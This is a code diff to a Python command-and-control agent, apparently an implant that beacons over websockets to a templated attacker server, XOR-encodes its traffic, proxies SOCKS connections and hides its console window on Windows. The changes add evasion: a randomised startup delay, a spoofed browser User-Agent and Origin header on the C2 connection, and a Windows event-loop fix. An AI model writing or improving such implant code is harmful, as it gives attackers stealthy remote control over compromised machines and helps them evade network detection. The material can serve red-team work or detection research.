@@ -10,6 +10,10 @@ import socket
 import base64
 import sys
 
+import random as _rjit
+import time as _tjit
+_tjit.sleep(_rjit.uniform(0.5, 5.0))
+
 SERVER_HOST = "{{C2_HOST}}"
 SERVER_PORT = {{C2_PORT}}
 RECONNECT_DELAY = 5
@@ -21,8 +25,8 @@ BEACON_JITTER = {{BEACON_JITTER}}  # Percentage (0-100)
 def simple_encrypt(data: str) -> str:
     """XOR encryption"""
     key = b'{{ENCRYPTION_KEY}}'
-    encoded = data.encode()
-    encrypted = bytes([encoded[i] ^ key[i % len(key)] for i in range(len(encoded))])
+    encoded = data.encode('latin-1')
+    encrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(encoded))
     return base64.b64encode(encrypted).decode()
 
 
@@ -30,8 +34,8 @@ def simple_decrypt(data: str) -> str:
     """XOR decryption"""
     key = b'{{ENCRYPTION_KEY}}'
     decoded = base64.b64decode(data.encode())
-    decrypted = bytes([decoded[i] ^ key[i % len(key)] for i in range(len(decoded))])
-    return decrypted.decode()
+    decrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(decoded))
+    return decrypted.decode('latin-1')
 
 
 def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
@@ -125,6 +129,11 @@ async def socks_proxy_handler(websocket, host: str, port: int):
         return None, None
 
 
+WS_HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Origin': f'http://{SERVER_HOST}',
+}
+
 async def connect_to_server():
     """Main agent connection loop"""
     uri = f"ws://{SERVER_HOST}:{SERVER_PORT}"
@@ -139,7 +148,7 @@ async def connect_to_server():
 
     while True:
         try:
-            async with websockets.connect(uri, max_size=10485760) as websocket:
+            async with websockets.connect(uri, max_size=10485760, extra_headers=WS_HEADERS) as websocket:
                 metadata = get_metadata()
                 metadata['mode'] = current_mode
                 metadata['beacon_interval'] = beacon_interval
@@ -354,6 +363,10 @@ if __name__ == '__main__':
             import ctypes
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
         except:
+            pass
+        try:
+            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+        except AttributeError:
             pass
 
     try:
